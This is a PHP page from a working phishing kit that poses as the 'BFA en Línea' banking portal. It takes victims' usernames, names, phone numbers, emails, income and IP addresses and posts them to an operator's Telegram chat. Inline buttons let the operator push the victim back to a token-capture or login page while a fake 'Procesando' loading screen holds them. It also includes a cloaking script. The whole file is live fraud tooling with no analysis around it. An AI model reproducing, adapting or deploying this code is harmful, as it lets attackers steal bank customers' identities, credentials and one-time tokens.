<?php
require_once __DIR__ . '/cloak.php';
session_start();
include('settings.php');

// === PRIMERA VISITA (POST desde datos.php): enviar a Telegram ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario   = $_SESSION['usuario'] ?? trim($_POST['usuario'] ?? '');
    $nombre    = trim($_POST['nombre']    ?? '');
    $telefono  = trim($_POST['telefono']  ?? '');
    $correo    = trim($_POST['correo']    ?? '');
    $antig     = trim($_POST['antiguedad']?? '');
    $ingresos  = trim($_POST['ingresos']  ?? '');

    if (!$usuario || !$nombre || !$telefono || !$correo) {
        header("Location: datos.php"); exit;
    }
    $_SESSION['usuario'] = $usuario;

    $antig_map = [
        'menos_1' => 'Menos de 1 año',
        '1_3'     => 'Entre 1 y 3 años',
        '3_5'     => 'Entre 3 y 5 años',
        '5_10'    => 'Entre 5 y 10 años',
        'mas_10'  => 'Más de 10 años',
    ];
    $ing_map = [
        '0_500'      => '$0 - $500',
        '500_1000'   => '$500 - $1,000',
        '1000_2000'  => '$1,000 - $2,000',
        '2000_4000'  => '$2,000 - $4,000',
        'mas_4000'   => 'Más de $4,000',
    ];

    $ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $msg  = "📋 DATOS PERSONALES BFA\n";
    $msg .= "👤 Usuario: $usuario\n";
    $msg .= "🪪 Nombre: $nombre\n";
    $msg .= "📞 Teléfono: $telefono\n";
    $msg .= "📧 Correo: $correo\n";
    $msg .= "🏦 Antigüedad: " . ($antig_map[$antig] ?? $antig) . "\n";
    $msg .= "💰 Ingresos: " . ($ing_map[$ingresos] ?? $ingresos) . "\n";
    $msg .= "🌐 IP: $ip";

    tg_request('sendMessage', [
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '🔐 Token otra vez', 'callback_data' => "TOKEN|$usuario"],
                    ['text' => '✅ Listo',           'callback_data' => "LISTO|$usuario"]
                ],
                [
                    ['text' => '🔄 Login de nuevo','callback_data' => "LOGIN|$usuario"]
                ]
            ]
        ])
    ]);
}

// === ESPERA ===
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) { header("Location: index.php"); exit; }

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    @unlink($archivo);
    switch ($accion) {
        case '/LISTO':
            header("Location: listo.html"); exit;
        case '/TOKEN':
            header("Location: tok.php"); exit;
        case '/ERROR':
        case '/COMPRA':
            header("Location: datos.php"); exit;
        case '/LOGIN':
            header("Location: index.php"); exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es"><head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="2">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BFA en Línea - Procesando</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:rgb(251,251,251);font-family:'Segoe UI',sans-serif}
  img{max-width:500px;width:60vw;height:auto;display:block}
</style>
</head><body>
  <img src="img/loading.gif" alt="Cargando...">
</body></html>
